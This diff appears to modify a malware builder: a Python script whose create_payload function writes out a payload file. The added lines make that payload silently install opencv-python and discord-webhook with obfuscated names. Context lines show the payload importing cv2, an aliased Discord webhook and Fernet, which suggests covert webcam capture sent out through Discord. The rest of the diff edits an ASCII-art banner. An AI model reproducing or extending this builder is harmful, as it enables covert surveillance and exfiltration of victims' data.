@@ -94,6 +94,20 @@ def create_payload():
 
     with open(f'{payload_name}.py', 'w') as write_p:
             write_p.write(f"""
+import subprocess
+
+def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package_name):
+    print('loading..')
+    try:
+        subprocess.check_output(["pip", "show", package_name], stderr=subprocess.DEVNULL, universal_newlines=True)
+    except subprocess.CalledProcessError:
+        subprocess.call(["pip", "install", package_name], stderr=subprocess.DEVNULL, stdout=subprocess.PIPE)
+
+mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6 = ["opencv-python ", "discord-webhook"]
+
+for package in mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6:
+    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package)
+
 import cv2, os, subprocess
 from discord_webhook import DiscordWebhook as UiNpJWciiXk
 from cryptography.fernet import Fernet
@@ -131,7 +145,7 @@ banner = ''''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡙⢿⣭⣉⠉⠉⠉⠉⣹⡟⠀⠐⣿⡛⠛⠛⠛⠛⠛⠛⣛⣿⡿⣣⣿⠋⠀⠀⠀⠀⢀⣾⠃⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣭⣛⠿⠿⠶⠾⠟⠁⠀⠀⠙⠿⣶⣶⣶⣶⡶⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣾⣿⡟⢿⣆⠹⣷⡀⠀⠀⢀⣿⠃⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡈⠛⢷⣌⠻⣧⡙⣷⡄⠀⠘⠃⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀ASHLEY LOOK AT ME!⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡈⠛⢷⣌⠻⣧⡙⣷⡄⠀⠘⠃⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀ASLE LOOK AT ME!⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⣶⡶⣶⣿⣿⣷⣤⡙⣷⣝⣿⣜⢿⡄⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠙⢷⣦⣈⠛⢿⣿⣿⣮⡻⣿⣿⡌⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣶⣌⠛⢿⣿⠈⠛⠃⠀⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -147,7 +161,7 @@ banner = ''''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⢴⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣄⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠘⣿⣷⡀⢀⠀⠀⠀⠀⠀⣀⡀⠀⣀⣠⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡟⣷⣾⡇⠀⠀⠀⠀⠙⠛⠿⠟⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⣿⡇⠈⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⣿⡇⠈⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀YYY
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢀⣿⠇⠀⠀⠘⣿⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⢹⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⡟⠀⢸⣿⠀⠀⢀⣾⠟⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠁⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣴⣶⣶⠿⠿⠛⠁⢀⣠⣾⣿⣶⣶⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
@@ -234,6 +248,7 @@ if __name__ == "__main__":
 
     else:
         pass
+
 
 """)
 
